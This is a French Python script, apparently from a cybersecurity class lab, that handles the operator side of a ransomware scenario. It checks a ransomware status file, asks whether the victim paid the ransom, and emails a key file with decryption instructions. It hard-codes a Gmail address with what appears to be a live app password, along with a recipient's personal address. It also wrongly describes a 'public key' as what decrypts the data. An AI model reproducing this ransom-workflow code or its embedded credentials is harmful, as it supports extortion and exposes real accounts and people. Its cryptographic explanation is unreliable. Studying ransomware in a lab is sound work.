import yagmail
import os
from datetime import datetime

# ============================================
# CONFIGURATION EMAIL
# ============================================
EMAIL_EXPEDITEUR   = "mpigajesse@gmail.com"
EMAIL_MOT_DE_PASSE = "zdsl avej lqid xcsu"
EMAIL_DESTINATAIRE = "naomiemoussavou98@gmail.com"

# ============================================
# 1. VÉRIFIER LE STATUT DU RANSOMWARE
# ============================================
print("="*80)
print("🔑 ENVOI MANUEL DE LA CLÉ PUBLIQUE")
print("="*80 + "\n")

# Lire les informations du ransomware
try:
    with open("ransomware_info.txt", "r") as f:
        info = f.read()
    print("✅ Informations du ransomware chargées :")
    print(info)
    print()
except FileNotFoundError:
    print("⚠️ Fichier ransomware_info.txt introuvable.")
    print("   Assurez-vous que le ransomware a été exécuté.")
    exit(1)

# ============================================
# 2. CONFIRMATION DE L'ENVOI
# ============================================
print("📌 CONFIRMATION REQUISE :")
print(f"   • Victime : {EMAIL_DESTINATAIRE}")
print("   • Vous êtes sur le point d'envoyer la clé publique")
print("   • La victime a-t-elle payé la rançon ?")
print()
response = input("✅ Confirmer l'envoi de la clé publique ? (oui/non) : ")

if response.lower() != "oui":
    print("❌ Envoi annulé.")
    exit(0)

# ============================================
# 3. ENVOI DE LA CLÉ PUBLIQUE PAR EMAIL
# ============================================
print("\n📧 Envoi de la clé publique à la victime...")

try:
    # Lire la clé publique
    with open("cle_publique.pem", "r") as f:
        contenu_cle_publique = f.read()
    
    sujet = "🔑 CLÉ PUBLIQUE DE DÉCHIFFREMENT - Naomie Entreprise"
    
    corps_message = f"""
🔑 CLÉ PUBLIQUE DE DÉCHIFFREMENT
================================================

Bonjour,

Suite à votre paiement, nous vous transmettons la clé publique 
nécessaire pour déchiffrer vos données.

================================================
CLÉ PUBLIQUE
================================================

{contenu_cle_publique}

================================================
INSTRUCTIONS DE DÉCHIFFREMENT
================================================

1. Sauvegardez cette clé dans un fichier : cle_publique_recue.pem
2. Placez le fichier dans le dossier : ~/projet/
3. Exécutez le script de déchiffrement :
   cd ~/projet
   python3 decrypt.py

================================================
INFORMATIONS IMPORTANTES
================================================

📌 Date d'envoi : {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
📌 Après déchiffrement, vos données seront restaurées
📌 Conservez cette clé en lieu sûr

================================================
ATTENTION
================================================

⚠️ Cette clé est valable UNIQUEMENT pour vos données.
⚠️ Ne la partagez avec personne.
⚠️ Après déchiffrement, vous pouvez supprimer cette clé.

================================================
CONTACT
================================================

📞 En cas de problème : mpigajesse@gmail.com

--- Message automatique - TP Cybersécurité ---
"""
    
    # Envoyer l'email
    yag = yagmail.SMTP(EMAIL_EXPEDITEUR, EMAIL_MOT_DE_PASSE)
    yag.send(
        to=EMAIL_DESTINATAIRE,
        subject=sujet,
        contents=corps_message,
        attachments=["cle_publique.pem"]
    )
    
    print(f"✅ Email envoyé avec succès à {EMAIL_DESTINATAIRE}")
    print("   📎 Pièce jointe : cle_publique.pem")
    
    # Mettre à jour le statut
    with open("ransomware_info.txt", "w") as f:
        f.write(f"STATUT=CLÉ_ENVOYÉE\n")
        f.write(f"DATE_ENVOI={datetime.now().isoformat()}\n")
    
    print("\n✅ Statut mis à jour : CLÉ_ENVOYÉE")
    
except Exception as e:
    print(f"❌ Erreur lors de l'envoi de l'email : {e}")
    exit(1)

print("\n" + "="*80)
print("🔑 PROCÉDURE TERMINÉE")
print("   La victime peut maintenant déchiffrer ses données.")
print("="*80)
